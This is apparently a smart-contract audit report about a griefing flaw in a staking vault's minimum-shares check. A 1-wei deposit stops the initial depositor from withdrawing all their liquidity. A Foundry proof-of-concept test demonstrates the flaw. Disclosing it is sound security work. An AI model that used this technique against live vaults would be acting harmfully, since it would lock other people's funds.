# Vulnerability details

## Impact
The ``_checkMinShares`` function is designed to prevent the vault from having a minimal, non-zero amount of shares that could be exploited in a donation attack. However, this implementation creates a vulnerability where an attacker can permanently lock a portion of the initial liquidity in the vault. By sending a minimal amount of assets (e.g., 1 wei) to the vault and leaving it there, the initial liquidity provider may be unable to fully withdraw their liquidity (e.g., ``0.10e18`` LP), as the ``_checkMinShares`` function will revert any transaction attempting to reduce the total shares below a certain threshold (``MIN_SHARES``).

This effectively traps the initial liquidity in the vault, preventing the original supplier from ever fully withdrawing their assets, as the system requires the total supply of shares to remain above ``MIN_SHARES`` or revert the transaction.

## Proof of Concept
copy and paste this test into ``StakingLP.t.sol`` in the testing suit offered by the protocol:
```
    function test_walter() public {
        // setup
        vm.startPrank(user1);
        liquidityPool.approve(address(stakingLpEth), 0.1 ether);
        stakingLpEth.deposit(0.1 ether, user1);
        vm.stopPrank();

        // attack - deposit of 1 wei
        vm.startPrank(user2);
        liquidityPool.approve(address(stakingLpEth), 1 wei);
        stakingLpEth.deposit(1 wei, user2);
        vm.stopPrank();

        //trying to withdraw
        vm.startPrank(user1);
        vm.expectRevert(StakingLPEth.MinSharesViolation.selector);
        stakingLpEth.cooldownAssets(0.10 ether); // try to initialize withdraw of all
        vm.stopPrank();

        // effective withdraw with no reverts and 0.01 LP missing
        vm.startPrank(user1);
        stakingLpEth.cooldownAssets(0.09 ether); // withdraw of all minus 0.01 LP
        vm.warp(block.timestamp + 7 days);
        stakingLpEth.unstake(user1);
        vm.stopPrank();
    }
```
